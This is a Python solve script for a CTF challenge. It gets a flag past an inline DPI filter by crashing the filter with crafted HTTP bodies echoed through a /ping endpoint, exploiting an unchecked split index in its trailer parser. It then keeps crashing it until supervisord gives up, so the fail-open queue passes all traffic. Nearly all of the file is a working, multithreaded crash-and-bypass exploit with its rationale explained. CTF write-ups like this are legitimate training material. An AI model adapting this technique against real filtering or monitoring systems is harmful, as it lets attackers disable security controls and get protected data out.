"""Exfiltrate the honey.txt flag past the "Медофильтр 2" inline DPI firewall.

The target container runs two Go binaries behind one published port 8080:

* ``cdn``  -- a static file server that also echoes request bodies at ``/ping``
  (``io.Copy(w, r.Body)``).  ``honey.txt`` holds the ``avito{...}`` flag.
* ``hlp``  -- a DPI filter.  ``iptables -I OUTPUT -p tcp --sport 8080 -j NFQUEUE
  --queue-num 1337 --queue-bypass`` hands every *cdn -> client* packet to a
  userspace program that reassembles the HTTP response and drops the whole flow
  when it sees ``avito{``.  A plain ``GET /static/honey.txt`` is therefore
  dropped (the edge returns 504 / the socket hangs).

The exploit chains two bugs:

1. ``httpassembly.responce.TrailerNonChanked`` does
   ``bytes.SplitN(line, []byte(":"), 2)`` then reads ``nameAndValue[1]`` without
   checking the length.  A *complete* HTTP response followed by a colon-less
   line in the filter's reassembly buffer makes that index panic -> ``hlp``
   crashes (exit status 2).  We manufacture that buffer state with ``/ping``:
   a large echo becomes a chunked response; the filter's ``responce.Add`` resets
   its buffer once it exceeds 3072 bytes (``fullResponceMaxSize``), realigning
   the parser onto an attacker-controlled byte offset.  By packing the echo body
   with back-to-back fake mini-responses ``HTTP/1.1 200 OK\\r\\nContent-Length:
   0\\r\\n\\r\\nZ\\r\\n`` (a valid complete response whose trailing ``Z`` line has
   no colon) and sweeping a 0..40 byte front pad, some post-reset realignment
   lands exactly on a fake response -> a panic regardless of TCP segmentation.

2. ``supervisord`` runs ``hlp`` with the defaults ``autorestart=true``,
   ``startretries=3``, ``startsecs=1``.  Crash it more than three times faster
   than it can stay up for one second and supervisord gives up
   ("entered FATAL state, too many start retries too quickly").  ``hlp`` then
   stays down permanently, the NFQUEUE has no listener, and ``--queue-bypass``
   fails open -> every response, including ``honey.txt``, sails through.

Even before FATAL, each individual crash opens a short no-listener window in
which a concurrent ``honey.txt`` request fails open, so the fetch loop below
wins whether a single window or the permanent FATAL state is what lets it
through.  The crash count is capped so the filter's unbounded flow/stream leak
never OOM-kills the whole container (which would take ``cdn`` down with it).

Usage::

    uv run python filter2/solve_filter2.py https://filter2-srv-XXXX.avitoctf.ru
    uv run python filter2/solve_filter2.py http://127.0.0.1:8080  # local docker replica
"""

from __future__ import annotations

import re
import socket
import ssl
import sys
import threading
import time
from urllib.parse import urlparse

# One fake but *complete* HTTP response.  ReadResponse consumes it (Content-Length
# 0 => empty body, parse complete), then TrailerNonChanked reads the leftover
# "Z\r\n" line, splits on ':' into a single element and indexes [1] -> panic.
_MARKER = b"HTTP/1.1 200 OK\r\nContent-Length: 0\r\n\r\nZ\r\n"
# ~41 KB of packed markers: enough buffer resets for a realignment to hit a
# marker start; light enough that a few hundred of them never OOM the container.
_CRASH_BODY_UNITS = 1000
_FLAG_RE = re.compile(rb"avito\{[^}]*\}")


class Target:
    """Raw HTTP/1.1 client (server-side keep-alive is disabled anyway)."""

    def __init__(self, base_url: str) -> None:
        parsed = urlparse(base_url)
        self.host = parsed.hostname or "127.0.0.1"
        self.tls = parsed.scheme == "https"
        self.port = parsed.port or (443 if self.tls else 80)

    def _connect(self, timeout: float) -> socket.socket:
        sock: socket.socket = socket.create_connection((self.host, self.port), timeout=timeout)
        if self.tls:
            sock = ssl.create_default_context().wrap_socket(sock, server_hostname=self.host)
        return sock

    def send_crash(self, pad: int) -> None:
        """POST a marker-packed body to /ping to panic the filter."""
        body = b"A" * pad + _MARKER * _CRASH_BODY_UNITS
        head = (
            "POST /ping HTTP/1.1\r\nHost: %s\r\nContent-Length: %d\r\n"
            "Connection: close\r\n\r\n" % (self.host, len(body))
        ).encode()
        sock = self._connect(timeout=8)
        try:
            sock.sendall(head + body)
            while sock.recv(65536):
                pass
        finally:
            sock.close()

    def fetch_flag(self) -> str | None:
        """GET honey.txt; return the flag if the filter let it through."""
        req = (
            "GET /static/honey.txt HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n" % self.host
        ).encode()
        sock = self._connect(timeout=4)
        sock.settimeout(3)
        data = b""
        try:
            sock.sendall(req)
            while True:
                chunk = sock.recv(65536)
                if not chunk:
                    break
                data += chunk
        except OSError:
            pass
        finally:
            sock.close()
        match = _FLAG_RE.search(data)
        return match.group(0).decode() if match else None


def exploit(
    base_url: str,
    max_crash_requests: int = 200,
    crash_threads: int = 4,
    fetch_threads: int = 6,
    deadline_seconds: float = 120.0,
) -> str | None:
    """Crash hlp into FATAL while polling honey.txt; return the flag or None."""
    target = Target(base_url)
    found: dict[str, str | None] = {"flag": None}
    sent = {"n": 0}
    lock = threading.Lock()
    stop = threading.Event()

    def crasher() -> None:
        pad = 0
        while not stop.is_set():
            with lock:
                if sent["n"] >= max_crash_requests:
                    return
                sent["n"] += 1
            try:
                target.send_crash(pad % 41)  # sweep all 41 marker phases
            except OSError:
                pass
            pad += 1

    def fetcher() -> None:
        while not stop.is_set() and found["flag"] is None:
            try:
                flag = target.fetch_flag()
            except OSError:
                flag = None
            if flag:
                found["flag"] = flag
                stop.set()
                return
            time.sleep(0.05)

    threads = [threading.Thread(target=crasher, daemon=True) for _ in range(crash_threads)]
    threads += [threading.Thread(target=fetcher, daemon=True) for _ in range(fetch_threads)]
    start = time.time()
    for thread in threads:
        thread.start()
    while found["flag"] is None and time.time() - start < deadline_seconds:
        time.sleep(0.1)
    stop.set()
    time.sleep(0.3)
    return found["flag"]


def main(argv: list[str]) -> int:
    if len(argv) != 2:
        print("usage: uv run python filter2/solve_filter2.py <base_url>", file=sys.stderr)
        return 2
    base_url = argv[1].rstrip("/")
    print("[*] attacking %s" % base_url)
    flag = exploit(base_url)
    if flag:
        print("[+] FLAG: %s" % flag)
        return 0
    print("[-] no flag recovered (is the instance up / reachable?)", file=sys.stderr)
    return 1


if __name__ == "__main__":
    raise SystemExit(main(sys.argv))
